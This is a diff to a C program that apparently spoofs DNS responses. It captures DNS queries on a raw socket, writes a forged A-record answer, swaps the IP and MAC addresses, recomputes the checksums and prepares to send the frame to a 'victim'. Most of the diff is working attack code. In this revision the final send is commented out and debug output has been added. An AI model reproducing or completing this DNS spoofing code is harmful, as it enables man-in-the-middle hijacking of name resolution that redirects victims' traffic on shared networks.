@@ -134,7 +134,7 @@ int main(int argc, char** argv) {
   struct ethhdr* fhead;
   struct iphdr *ip;
   struct ifreq ifr;
-  struct sockaddr_ll sall, gwall;
+  struct sockaddr_ll sall, gwall, vall;
   struct in_addr gway, mask, bcast;
   char saddr[16], daddr[16], bcastaddr[16];
   unsigned char hwaddr[6];
@@ -167,6 +167,16 @@ int main(int argc, char** argv) {
   sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
          &gwall.sll_addr[0], &gwall.sll_addr[1], &gwall.sll_addr[2],
          &gwall.sll_addr[3], &gwall.sll_addr[4], &gwall.sll_addr[5]);
+
+  // set up victim address struct
+  memset(&vall, 0, sizeof(struct sockaddr_ll));
+  vall.sll_family = AF_PACKET;
+  vall.sll_protocol = htons(ETH_P_IP);
+  vall.sll_ifindex = ifindex;
+  vall.sll_hatype = ARPHRD_ETHER;
+  vall.sll_pkttype = PACKET_OUTGOING;
+  vall.sll_halen = ETH_ALEN;
+
 
   // set up receiving socket
   sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
@@ -251,13 +261,18 @@ int main(int argc, char** argv) {
           continue;
         }
 
-        printf("got:\n");
-        for (i = 0; i < dnslen ; i++) {
-          printf("%02x ", (char) udpdata[i]);
-          if ((i + 1) % 16 == 0)
-            printf("\n");
-        }
-        printf("\n\n");
+        // printf("got:\n");
+        // for (i = 0; i < dnslen ; i++) {
+        //   printf("%02x ", (char) udpdata[i]);
+        //   if ((i + 1) % 16 == 0)
+        //     printf("\n");
+        // }
+        // printf("\n\n");
+
+        int response_len_without_answer = 12 + query_len(d) + 4;
+        int additional_bytes = ntohs(udp->len) - 8 - response_len_without_answer;
+
+        printf("Additional: %d\n", additional_bytes);
 
         // start building spoofed answer
         unsigned short new_flags = 0;
@@ -269,8 +284,10 @@ int main(int argc, char** argv) {
 
         dnshdr->flags = htons(new_flags);
         dnshdr->as = htons(1);
+        dnshdr->authrrs = htons(0);
+        dnshdr->addrrs = htons(0);
 
-        answer = (struct dns_answer *)(udpdata + dnslen);
+        answer = (struct dns_answer *)(udpdata + dnslen - additional_bytes);
         // spoof the answer
         answer->name = htons(0xc00c);
         answer->type = htons(1);
@@ -285,11 +302,13 @@ int main(int argc, char** argv) {
         udp->source = port;
 
         // update lengths
-        udp->len = htons(ntohs(udp->len) + 16);
-        ip->tot_len = htons(ntohs(ip->tot_len) + 16);
+        udp->len = htons(ntohs(udp->len) - additional_bytes + 16);
+        ip->tot_len = htons(ntohs(ip->tot_len) - additional_bytes + 16);
 
         ip->check = 0;
         udp->check = 0;
+
+        ip->id = htons((ntohs(ip->id) + 3000) % (65536));
 
         // swap ip addresses
         inet_pton(AF_INET, daddr, &ip->saddr);
@@ -299,31 +318,46 @@ int main(int argc, char** argv) {
         ip->frag_off = ntohs(1 << 14);
 
         // calculate checksums
-        udp->check = udp_checksum(udp, udp->len, ip->saddr, ip->daddr);
-        ip->check = ip_checksum(ip, udp->len + (ip->ihl * 4));
+        printf("UDPlen: %d, IPlen: %d\n", ntohs(udp->len), ntohs(udp->len) + (ip->ihl * 4));
+        printf("UDPchk: %04x\n", udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
+        udp->check = htons(udp_checksum(udp, ntohs(udp->len), ip->saddr, ip->daddr));
+        printf("UDPchk: %04x, IPchk: %04x\n", udp->check, ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));
+        //ip->check = htons(ip_checksum(ip, ntohs(udp->len) + (ip->ihl * 4)));
 
         int answerlen = dnslen + 16;
 
-        printf("to send:\n");
-        for (i = 0; i < answerlen ; i++) {
-          printf("%02x ", (char) udpdata[i]);
-          if ((i + 1) % 16 == 0)
-            printf("\n");
-        }
-        printf("\n\n");
+        // printf("to send:\n");
+        // for (i = 0; i < ntohs(ip->tot_len) ; i++) {
+        //   printf("%02x ", (char) ((char *)ip)[i]);
+        //   if ((i + 1) % 16 == 0)
+        //     printf("\n");
+        // }
+        // printf("\n\n");
 
         // swap hardware addresses
         memcpy(fhead->h_dest, fhead->h_source, ETH_ALEN);
         memcpy(fhead->h_source, hwaddr, ETH_ALEN);
 
-        // sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-        //   &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
-        //   &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);
+        printf("d: %hhx:%hhx:%hhx:%hhx:%hhx:%hhx\n",
+          fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
+          fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
 
-        len = sendto(gwsfd, frame, len + 16, 0,
-              (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));
+        printf("s: %hhx:%hhx:%hhx:%hhx:%hhx:%hhx\n",
+          fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
+          fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
 
-        printf("sent\n");
+        vall.sll_addr[0] = fhead->h_dest[0];
+        vall.sll_addr[1] = fhead->h_dest[1];
+        vall.sll_addr[2] = fhead->h_dest[2];
+        vall.sll_addr[3] = fhead->h_dest[3];
+        vall.sll_addr[4] = fhead->h_dest[4];
+        vall.sll_addr[5] = fhead->h_dest[5];
+
+        //sendto(gwsfd, frame, len - additional_bytes + 16, 0,
+        //      (struct sockaddr*) &vall, sizeof(struct sockaddr_ll));
+
+        // printf("sent\n");
+        printf("\n");
 
         delete_domain_struct(d);
       }
@@ -356,6 +390,7 @@ int main(int argc, char** argv) {
     }
     free(frame);
   }
+  close(gwsfd);
   close(sfd);
   return EXIT_SUCCESS;
 }
